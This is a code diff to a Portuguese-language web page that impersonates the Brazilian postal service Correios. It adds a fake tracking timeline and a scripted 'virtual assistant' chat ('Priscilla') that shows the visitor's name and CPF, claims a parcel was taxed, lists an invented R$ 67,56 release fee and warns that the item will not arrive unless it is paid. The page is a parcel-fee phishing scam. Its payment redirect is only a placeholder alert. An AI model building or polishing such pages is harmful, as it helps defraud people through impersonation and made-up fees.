@@ -384,6 +384,207 @@
       }
     }
 
+    /* Caixa image - agora como banner */
+    .caixa-image {
+      margin: 25px 0;
+      text-align: center;
+      position: relative;
+      width: 100%;
+    }
+
+    .caixa-image img {
+      width: 100%;
+      max-width: 1000px;
+      height: auto;
+    }
+    
+    /* Estilo para o contêiner do banner */
+    .container {
+      position: relative;
+      width: 100%;
+      height: 200px;
+      margin: 20px 0;
+      background-color: #f0f0f0;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+
+    /* Estilo para a imagem da caixa como banner */
+    .overlay {
+      position: relative;
+      width: 100%;
+      height: 100%;
+    }
+
+    .overlay img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    /* Estilo para o texto sobreposto na imagem da caixa - reduzido 60% e preto */
+    .caixa-overlay-text {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: #000 !important; /* Preto garantido */
+      font-weight: bold;
+      text-align: left;
+      width: 80%;
+      font-size: 8px !important; /* 60% menor */
+      line-height: 1.4;
+    }
+
+    /* Container da caixa como banner - MODIFICADO PARA RESPONSIVIDADE */
+    .container {
+      position: relative;
+      width: 100%;
+      height: 200px; /* Altura de banner */
+      margin: 20px 0;
+      background-color: #f0f0f0;
+      border: 1px solid #ddd;
+    }
+
+    /* Garantindo que a imagem ocupe todo o espaço */
+    .overlay img {
+      width: 100%;
+      height: auto;
+      max-width: 1000px;
+    }
+
+    .rotate {
+      text-align: start;
+      transform: rotate(2deg);
+      color: #555 !important; /* Alterado para cinza */
+      font-weight: bold;
+      opacity: 0.5;
+      text-shadow: rgba(0, 0, 0, 0.3) 1px 1px 3px, rgba(0, 0, 0, 0.3) -1px -1px 3px, rgba(0, 0, 0, 0.1) 0px 0px 8px;
+      transform-style: preserve-3d;
+      transform: rotateX(1.2deg) rotateY(55deg);
+    }
+
+    /* Estilos Gerais */
+    .max-w-1200 {
+      max-width: 1200px !important;
+    }
+    
+    /* Estilo para o contêiner pai - MODIFICADO PARA RESPONSIVIDADE */
+    .container {
+      position: relative;
+      width: 100%;
+      height: 350px;
+      background-color: #f0f0f0;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      margin: 20px auto;
+    }
+
+    .overlay {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      background-image: url('images/Caixa.png');
+      background-size: cover;
+      background-position: center;
+      border-radius: 8px;
+    }
+
+    /* Estilo para o texto centralizado dentro da div - MODIFICADO PARA RESPONSIVIDADE */
+    .overlay-text {
+      position: absolute;
+      top: 60%;
+      left: 55%;
+      transform: translate(-50%, -50%);
+      background-color: transparent;
+      color: #555 !important; /* Alterado para cinza */
+      padding: 10px 20px;
+      font-size: 12px; /* Tamanho padrão para mobile */
+      text-align: center;
+      border-radius: 5px;
+      width: 80%;
+      max-width: 350px;
+    }
+
+    /* Efeito de piscar para atenção */
+    #blink {
+      animation: blink 1s infinite;
+    }
+    
+    @keyframes blink {
+      0% { opacity: 1; }
+      50% { opacity: 0.3; }
+      100% { opacity: 1; }
+    }
+    
+    /* Melhorias no botão */
+    #btn-pagar {
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 100%;
+    }
+    
+    #btn-pagar:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 12px rgba(0,0,0,0.15);
+    }
+
+    /* MODIFICAÇÕES PARA RESPONSIVIDADE */
+    @media (min-width: 768px) {
+      /* Ajustes para desktop */
+      .overlay-text {
+        font-size: 8px !important; /* Tamanho menor para desktop */
+      }
+      
+      #caixa-info-1, #caixa-info-2 {
+        font-size: 6px !important; /* Tamanho normal para desktop */
+      }
+    }
+
+    @media (max-width: 767px) {
+      /* Ajustes para mobile */
+      #top-bar {
+        font-size: 12px;
+      }
+      
+      #btn-entrar {
+        font-size: 12px;
+      }
+      
+      #btn-entrar img {
+        height: 16px;
+      }
+      
+      #pagamento {
+        padding: 0.5rem;
+      }
+      
+      .container {
+        height: 150px;
+      }
+      
+      #btn-pagar {
+        font-size: 0.8rem;
+      }
+      
+      .overlay-text {
+        font-size: 5.6px !important; /* Reduzido 30% para mobile (70% do original) */
+      }
+      
+      #caixa-info-1, #caixa-info-2 {
+        font-size: 4.2px !important; /* Reduzido 30% para mobile */
+        line-height: 1.2;
+      }
+      
+      /* Ajustes específicos para o texto da caixa */
+      .rotate {
+        margin-top: 15% !important;
+        margin-right: 0% !important;
+      }
+    }
+
     /* Estilos para o chat */
     #chat-container {
       display: none;
@@ -393,174 +594,60 @@
       border-radius: 10px;
       overflow: hidden;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      background-color: #f5f5f5;
-      font-family: Arial, sans-serif;
     }
 
-    .chat-header {
-      background-color: #003157;
-      color: white;
-      padding: 15px;
-      text-align: center;
-      font-weight: bold;
-      font-size: 16px;
-    }
-
-    .chat-messages {
-      padding: 15px;
-      height: 400px;
-      overflow-y: auto;
+    .chat-message {
       display: flex;
-      flex-direction: column;
-      gap: 15px;
-    }
-
-    .message {
-      max-width: 80%;
-      padding: 10px 15px;
-      border-radius: 18px;
-      position: relative;
-      animation: fadeIn 0.3s ease-out;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    .received {
-      align-self: flex-start;
-      background-color: white;
-      border-bottom-left-radius: 5px;
-      color: #333;
-    }
-
-    .sent {
-      align-self: flex-end;
-      background-color: #003157;
-      color: white;
-      border-bottom-right-radius: 5px;
-    }
-
-    .message-time {
-      font-size: 11px;
-      color: #999;
-      text-align: right;
-      margin-top: 5px;
-    }
-
-    .message-sender {
-      font-weight: bold;
-      margin-bottom: 5px;
-      font-size: 14px;
-    }
-
-    .message-text {
-      font-size: 14px;
-      line-height: 1.4;
-    }
-
-    .message-image {
-      max-width: 100%;
-      border-radius: 8px;
-      margin-top: 8px;
-    }
-
-    .chat-options {
       padding: 10px;
-      background-color: white;
-      border-top: 1px solid #eee;
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-    }
-
-    .option-btn {
-      padding: 10px 15px;
-      background-color: #003157;
-      color: white;
-      border: none;
-      border-radius: 20px;
-      cursor: pointer;
-      font-size: 14px;
-      align-self: flex-end;
-      transition: all 0.2s;
-      max-width: 80%;
-      text-align: center;
-    }
-
-    .option-btn:hover {
-      background-color: #001a33;
-      transform: translateY(-2px);
+      border-bottom: 1px solid #eee;
     }
 
     .avatar {
-      width: 32px;
-      height: 32px;
+      width: 40px;
+      height: 40px;
       border-radius: 50%;
-      margin-right: 8px;
+      margin-right: 10px;
       object-fit: cover;
-    }
-
-    .message-with-avatar {
-      display: flex;
-      align-items: flex-start;
     }
 
     .message-content {
       flex: 1;
     }
 
+    .message-sender {
+      font-weight: bold;
+      color: #003157;
+      margin-bottom: 5px;
+    }
+
+    .message-text {
+      color: #333;
+    }
+
+    .message-image {
+      max-width: 100%;
+      border-radius: 5px;
+      margin-top: 5px;
+    }
+
+    .chat-button {
+      background-color: #003157;
+      color: white;
+      border: none;
+      padding: 10px 15px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin: 10px;
+      display: block;
+      width: calc(100% - 20px);
+    }
+
+    .chat-button:hover {
+      background-color: #001a33;
+    }
+
     .hidden {
       display: none;
-    }
-
-    /* Estilos para o status de digitação */
-    .typing-indicator {
-      display: flex;
-      align-items: center;
-      padding: 10px 15px;
-      background-color: white;
-      border-radius: 18px;
-      border-bottom-left-radius: 5px;
-      align-self: flex-start;
-      margin-bottom: 15px;
-    }
-
-    .typing-dot {
-      width: 8px;
-      height: 8px;
-      background-color: #999;
-      border-radius: 50%;
-      margin: 0 2px;
-      animation: typingAnimation 1.4s infinite ease-in-out;
-    }
-
-    .typing-dot:nth-child(1) {
-      animation-delay: 0s;
-    }
-
-    .typing-dot:nth-child(2) {
-      animation-delay: 0.2s;
-    }
-
-    .typing-dot:nth-child(3) {
-      animation-delay: 0.4s;
-    }
-
-    @keyframes typingAnimation {
-      0%, 60%, 100% { transform: translateY(0); }
-      30% { transform: translateY(-5px); }
-    }
-
-    /* Estilos para o rodapé do chat */
-    .chat-footer {
-      padding: 10px;
-      background-color: white;
-      border-top: 1px solid #eee;
-      text-align: center;
-      font-size: 12px;
-      color: #999;
     }
   </style>
 </head>
@@ -665,26 +752,184 @@
       <div style="padding: 0px 30px 0px 30px; width: 100%; max-width: 1200px; margin: 0 auto;">
         <button id="btn-pagar" class="btn btn-primary" style="font-size:13px;width: 100%; max-width: 100%; margin: 0 auto; display: block; padding: 12px;">CLIQUE AQUI PARA LIBERAÇÃO DO SEU PEDIDO</button>
       </div>
+
+      <section class="mt-3 p-4 w-95 max-w-1200" style="margin: 0 auto;">
+        <div class="container">
+          <div class="overlay">
+            <div class="overlay-text">
+              <!-- Blocos de informação com tamanho fixo -->
+              <p class="rotate" 
+                 style="margin-top: 28%; 
+                        margin-right: 0%; 
+                        color: #464545 !important; 
+                        font-size: 6px !important;
+                        transform: rotateX(1.2deg) rotateY(55deg);" 
+                 id="caixa-info-1">
+                NOME: <span id="pag-nome" style="color: #464545 !important;"></span><br>
+                CPF: <span id="pag-cpf" style="color: #464545 !important;"></span>
+              </p>
+              
+              <p class="rotate" 
+                 style="margin-top: 10%; 
+                        color: #464545 !important; 
+                        font-size: 6px !important;
+                        transform: rotateX(1.2deg) rotateY(55deg);" 
+                 id="caixa-info-2">
+                RUA: <span id="pag-rua" style="color: #464545 !important;"></span><br>
+                BAIRRO: <span id="pag-bairro" style="color: #464545 !important;"></span><br>
+                CIDADE: <span id="pag-cidade" style="color: #464545 !important;"></span>
+              </p>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <style>
+        /* Estilos para desktop */
+        @media (min-width: 768px) {
+          #caixa-info-1, #caixa-info-2 {
+            font-size: 6px !important;
+          }
+        }
+        
+        /* Estilos para mobile */
+        @media (max-width: 767px) {
+          #caixa-info-1, #caixa-info-2 {
+            font-size: 4.2px !important; /* Reduzido 30% para mobile */
+          }
+        }
+      </style>
+
+      <section class="px-4 py mb-5 w-95 max-w-1000" style="margin:0 auto;">
+        <ul style="list-style: none; padding-left: 0;">
+            <!-- Primeiro item (sem linha conectora) -->
+            <li class="d-flex mt-4" style="position: relative">
+                <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" 
+                     style="width:50px;height:50px;border-radius:50%;z-index:100;min-width:50px">
+                    <img src="images/correios-icon-1.png" alt="Ícone de entrega" width="32">
+                </div>
+                <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
+                    <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
+                        Previsão de Entrega
+                    </h5>
+                    <span class="text-dark font-size-12 flex-wrap">
+                        3 dias após o pagamento
+                    </span>
+                </div>
+            </li>
+
+            <!-- Segundo item (com linha conectora) -->
+            <li class="d-flex mt-5" style="position: relative">
+                <div style="width:2px;height:120px;background-color:#FFC40C;position:absolute;top:-118px;left:24px"></div>
+                <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" 
+                     style="width:50px;height:50px;border-radius:50%;z-index:100;min-width:50px">
+                    <img src="images/cifrao.png" alt="Ícone de pagamento" width="24">
+                </div>
+                <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
+                    <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
+                        Objeto aguardando sua confirmação
+                    </h5>
+                    <span class="text-dark font-size-12 flex-wrap">
+                        em Unidade de Fiscalização em São Paulo<br>
+                    </span>
+                    <h5 class="mt-1 text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
+                        Realize o pagamento: <a href="#" class="text-blue">Efetuar Pagamento</a>
+                    </h5>
+                </div>
+            </li>
+
+            <!-- Terceiro item (com linha conectora) -->
+            <li class="d-flex mt-5" style="position: relative">
+                <div style="width:2px;height:120px;background-color:#FFC40C;position:absolute;top:-118px;left:24px"></div>
+                <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" 
+                     style="width:50px;height:50px;border-radius:50%;z-index:100;min-width:50px">
+                    <img src="images/caminhao.png" alt="Ícone de transporte" width="24">
+                </div>
+                <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
+                    <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
+                        Objeto em transferência - por favor aguarde
+                    </h5>
+                </div>
+            </li>
+
+            <!-- Quarto item (com linha conectora mais longa) -->
+            <li class="d-flex mt-5" style="position: relative">
+                <div style="width:2px;height:172px;background-color:#FFC40C;position:absolute;top:-170px;left:24px"></div>
+                <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" 
+                     style="width:50px;height:50px;border-radius:50%;z-index:100;min-width:50px">
+                    <img src="images/pacote.png" alt="Ícone de pacote" width="24">
+                </div>
+                <div class="d-flex flex-column ml-3 justify-content-center font-verdana">
+                    <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0">
+                        Objeto Postado
+                    </h5>
+                </div>
+            </li>
+        </ul>
+      </section>
+
+      <div class="btn-container">
+        <a href="#" id="voltar-rastreio">Voltar ao rastreamento</a>
+      </div>
     </section>
 
     <!-- Chat Container -->
     <div id="chat-container">
-      <div class="chat-header">
-        Atendimento Virtual - Correios
+      <!-- Parte 1 - Exibida automaticamente -->
+      <div id="part1" class="chat-message">
+        <img src="images/avatar.png" alt="Atendente" class="avatar">
+        <div class="message-content">
+          <div class="message-sender">Priscilla</div>
+          <div class="message-text">Bem-vindo(a) ao atendimento Virtual dos Correios.</div>
+          <div class="message-text">Identificamos no nosso Sistema que uma de suas Encomendas Foi Taxada</div>
+          <img src="images/image1.png" alt="Imagem 1" class="message-image">
+          <div class="message-text"><span id="chat-nome"></span>, você deseja solicitar a liberação da sua mercadoria?</div>
+        </div>
       </div>
-      
-      <div class="chat-messages" id="messages-container">
-        <!-- Mensagens serão adicionadas aqui dinamicamente -->
+
+      <!-- Parte 2 - Exibida após clicar no botão SIM -->
+      <div id="part2" class="chat-message hidden">
+        <img src="images/avatar.png" alt="Atendente" class="avatar">
+        <div class="message-content">
+          <div class="message-sender">Priscilla</div>
+          <img src="images/image2.png" alt="Imagem 2" class="message-image">
+          <div class="message-text">Por que essa taxa?</div>
+          <div class="message-text">A taxa cobre os custos de liberação alfandegária e envio da sua encomenda. Ela inclui:</div>
+          <div class="message-text">- Taxa de liberação: Cobrança padrão para processos alfandegários.</div>
+          <div class="message-text">- Peso da mercadoria – Valor ajustado conforme o peso do item.</div>
+          <div class="message-text">- Despacho postal – Serviço de liberação e envio.</div>
+        </div>
       </div>
-      
-      <div class="chat-options" id="chat-options">
-        <!-- Opções de resposta serão adicionadas aqui dinamicamente -->
+
+      <!-- Parte 3 - Exibida após clicar no botão "Entendi, continuar!" -->
+      <div id="part3" class="chat-message hidden">
+        <img src="images/avatar.png" alt="Atendente" class="avatar">
+        <div class="message-content">
+          <div class="message-sender">Priscilla</div>
+          <img src="images/image3.png" alt="Imagem 3" class="message-image">
+          <div class="message-text">GUIA DE PAGAMENTO GERADA COM SUCESSO!</div>
+          <div class="message-text">Taxa de Liberação: R$ 23,89</div>
+          <div class="message-text">Peso da mercadoria: R$ 19,50</div>
+          <div class="message-text">Despacho postal: R$ 24,17</div>
+          <div class="message-text">Total a Pagar: R$ 67,56</div>
+          <div class="message-text">Comprovante gerado com sucesso, caso não efetue o pagamento, a sua mercadoria não chegará até você.</div>
+          <div class="message-text">ATENÇÃO, <span id="chat-nome2"></span></div>
+          <div class="message-text">CPF: <span id="chat-cpf"></span></div>
+          <div class="message-text">Após a confirmação do pagamento, sua encomenda será liberada amanhã dia <span id="chat-data"></span></div>
+        </div>
       </div>
-      
-      <div class="chat-footer">
-        Atendimento oficial dos Correios - Seguro e confiável
-      </div>
+
+      <!-- Botões do chat -->
+      <button id="btn-sim" class="chat-button">SIM</button>
+      <button id="btn-continuar" class="chat-button hidden">Entendi, continuar!</button>
+      <button id="btn-acessar-guia" class="chat-button hidden">ACESSAR GUIA DE PAGAMENTO</button>
     </div>
+
+    <section class="my-4 w-95 max-w-1000" style="margin: 0 auto;">
+      <div>
+        <img src="images/banner-1.jpg" alt="" class="w-100" />
+      </div>
+    </section>
   </main>
 
   <footer class="d-flex flex-wrap justify-content-center px-5 py-4 bg-yellow text-blue-dark" style="font-family: Arial, sans-serif; font-size: 14px; text-align: center;">
@@ -822,185 +1067,6 @@
       return `${dd}/${mm}/${yyyy}`;
     }
 
-    // Funções para o chat
-    function addMessage(sender, text, isReceived, hasAvatar = false, imageUrl = null) {
-      const messagesContainer = document.getElementById('messages-container');
-      const messageDiv = document.createElement('div');
-      messageDiv.className = `message ${isReceived ? 'received' : 'sent'}`;
-      
-      if (hasAvatar) {
-        messageDiv.classList.add('message-with-avatar');
-        messageDiv.innerHTML = `
-          <img src="images/avatar.png" alt="${sender}" class="avatar">
-          <div class="message-content">
-            <div class="message-sender">${sender}</div>
-            <div class="message-text">${text}</div>
-            ${imageUrl ? `<img src="${imageUrl}" alt="Imagem" class="message-image">` : ''}
-            <div class="message-time">${new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</div>
-          </div>
-        `;
-      } else {
-        messageDiv.innerHTML = `
-          <div class="message-text">${text}</div>
-          ${imageUrl ? `<img src="${imageUrl}" alt="Imagem" class="message-image">` : ''}
-          <div class="message-time">${new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</div>
-        `;
-      }
-      
-      messagesContainer.appendChild(messageDiv);
-      messagesContainer.scrollTop = messagesContainer.scrollHeight;
-    }
-
-    function showTypingIndicator() {
-      const messagesContainer = document.getElementById('messages-container');
-      const typingDiv = document.createElement('div');
-      typingDiv.className = 'typing-indicator';
-      typingDiv.innerHTML = `
-        <img src="images/avatar.png" alt="Atendente" class="avatar">
-        <div class="typing-dots">
-          <div class="typing-dot"></div>
-          <div class="typing-dot"></div>
-          <div class="typing-dot"></div>
-        </div>
-      `;
-      messagesContainer.appendChild(typingDiv);
-      messagesContainer.scrollTop = messagesContainer.scrollHeight;
-      return typingDiv;
-    }
-
-    function removeTypingIndicator(typingDiv) {
-      if (typingDiv && typingDiv.parentNode) {
-        typingDiv.parentNode.removeChild(typingDiv);
-      }
-    }
-
-    function addOptionButton(text, callback) {
-      const optionsContainer = document.getElementById('chat-options');
-      const button = document.createElement('button');
-      button.className = 'option-btn';
-      button.textContent = text;
-      button.addEventListener('click', callback);
-      optionsContainer.appendChild(button);
-    }
-
-    function clearOptions() {
-      document.getElementById('chat-options').innerHTML = '';
-    }
-
-    function initChat() {
-      const messagesContainer = document.getElementById('messages-container');
-      messagesContainer.innerHTML = '';
-      
-      // Parte 1 do chat
-      setTimeout(() => {
-        addMessage('Priscilla', 'Bem-vindo(a) ao atendimento Virtual dos Correios.', true, true);
-        
-        setTimeout(() => {
-          addMessage('Priscilla', 'Identificamos no nosso Sistema que uma de suas Encomendas Foi Taxada', true, true);
-          
-          setTimeout(() => {
-            addMessage('Priscilla', '', true, true, 'images/image1.png');
-            
-            setTimeout(() => {
-              const nome = document.getElementById('res-nome').textContent;
-              addMessage('Priscilla', `${nome}, você deseja solicitar a liberação da sua mercadoria?`, true, true);
-              
-              // Mostra opção de resposta
-              clearOptions();
-              addOptionButton('SIM', () => {
-                // Parte 2 do chat
-                clearOptions();
-                const typing = showTypingIndicator();
-                
-                setTimeout(() => {
-                  removeTypingIndicator(typing);
-                  addMessage('Priscilla', '', true, true, 'images/image2.png');
-                  
-                  setTimeout(() => {
-                    addMessage('Priscilla', 'Por que essa taxa?', true, true);
-                    
-                    setTimeout(() => {
-                      addMessage('Priscilla', 'A taxa cobre os custos de liberação alfandegária e envio da sua encomenda. Ela inclui:', true, true);
-                      
-                      setTimeout(() => {
-                        addMessage('Priscilla', '- Taxa de liberação: Cobrança padrão para processos alfandegários.', true, true);
-                        
-                        setTimeout(() => {
-                          addMessage('Priscilla', '- Peso da mercadoria – Valor ajustado conforme o peso do item.', true, true);
-                          
-                          setTimeout(() => {
-                            addMessage('Priscilla', '- Despacho postal – Serviço de liberação e envio.', true, true);
-                            
-                            // Mostra opção de continuar
-                            setTimeout(() => {
-                              clearOptions();
-                              addOptionButton('Entendi, continuar!', () => {
-                                // Parte 3 do chat
-                                clearOptions();
-                                const typing = showTypingIndicator();
-                                
-                                setTimeout(() => {
-                                  removeTypingIndicator(typing);
-                                  addMessage('Priscilla', '', true, true, 'images/image3.png');
-                                  
-                                  setTimeout(() => {
-                                    addMessage('Priscilla', 'GUIA DE PAGAMENTO GERADA COM SUCESSO!', true, true);
-                                    
-                                    setTimeout(() => {
-                                      addMessage('Priscilla', 'Taxa de Liberação: R$ 23,89', true, true);
-                                      
-                                      setTimeout(() => {
-                                        addMessage('Priscilla', 'Peso da mercadoria: R$ 19,50', true, true);
-                                        
-                                        setTimeout(() => {
-                                          addMessage('Priscilla', 'Despacho postal: R$ 24,17', true, true);
-                                          
-                                          setTimeout(() => {
-                                            addMessage('Priscilla', 'Total a Pagar: R$ 67,56', true, true);
-                                            
-                                            setTimeout(() => {
-                                              addMessage('Priscilla', 'Comprovante gerado com sucesso, caso não efetue o pagamento, a sua mercadoria não chegará até você.', true, true);
-                                              
-                                              setTimeout(() => {
-                                                const nome = document.getElementById('res-nome').textContent;
-                                                const cpf = document.getElementById('res-cpf').textContent;
-                                                const data = getDataAmanha();
-                                                
-                                                addMessage('Priscilla', `ATENÇÃO, ${nome}`, true, true);
-                                                addMessage('Priscilla', `CPF: ${cpf}`, true, true);
-                                                addMessage('Priscilla', `Após a confirmação do pagamento, sua encomenda será liberada amanhã dia ${data}`, true, true);
-                                                
-                                                // Mostra opção final
-                                                setTimeout(() => {
-                                                  clearOptions();
-                                                  addOptionButton('ACESSAR GUIA DE PAGAMENTO', () => {
-                                                    alert('Redirecionando para a página de pagamento...');
-                                                    // Aqui você pode adicionar o redirecionamento real
-                                                  });
-                                                }, 500);
-                                              }, 500);
-                                            }, 500);
-                                          }, 500);
-                                        }, 500);
-                                      }, 500);
-                                    }, 500);
-                                  }, 500);
-                                }, 1500);
-                              });
-                            }, 500);
-                          }, 500);
-                        }, 500);
-                      }, 500);
-                    }, 500);
-                  }, 500);
-                }, 1500);
-              });
-            }, 500);
-          }, 500);
-        }, 500);
-      }, 1000);
-    }
-
     let intervalContagem;
 
     document.getElementById("form-rastreamento").addEventListener("submit", async function (event) {
@@ -1097,7 +1163,12 @@
     document.getElementById("btn-pagar").addEventListener("click", function() {
       document.getElementById("pagamento").style.display = "none";
       document.getElementById("chat-container").style.display = "block";
-      initChat();
+      
+      // Preenche os dados no chat
+      document.getElementById("chat-nome").textContent = document.getElementById("res-nome").textContent;
+      document.getElementById("chat-nome2").textContent = document.getElementById("res-nome").textContent;
+      document.getElementById("chat-cpf").textContent = document.getElementById("res-cpf").textContent;
+      document.getElementById("chat-data").textContent = getDataAmanha();
     });
 
     // Máscaras para CPF e CEP
@@ -1113,6 +1184,30 @@
       let value = e.target.value.replace(/\D/g, '');
       if (value.length > 5) value = value.substring(0, 5) + '-' + value.substring(5);
       e.target.value = value.substring(0, 9);
+    });
+
+    // Lógica do chat
+    document.getElementById('btn-sim').addEventListener('click', function() {
+      document.getElementById('part2').classList.remove('hidden');
+      document.getElementById('btn-sim').classList.add('hidden');
+      document.getElementById('btn-continuar').classList.remove('hidden');
+      
+      // Rolagem automática para a parte 2
+      document.getElementById('part2').scrollIntoView({ behavior: 'smooth' });
+    });
+
+    document.getElementById('btn-continuar').addEventListener('click', function() {
+      document.getElementById('part3').classList.remove('hidden');
+      document.getElementById('btn-continuar').classList.add('hidden');
+      document.getElementById('btn-acessar-guia').classList.remove('hidden');
+      
+      // Rolagem automática para a parte 3
+      document.getElementById('part3').scrollIntoView({ behavior: 'smooth' });
+    });
+
+    document.getElementById('btn-acessar-guia').addEventListener('click', function() {
+      alert('Redirecionando para a página de pagamento...');
+      // Aqui você pode adicionar o redirecionamento real para a página de pagamento
     });
   </script>
 </body>
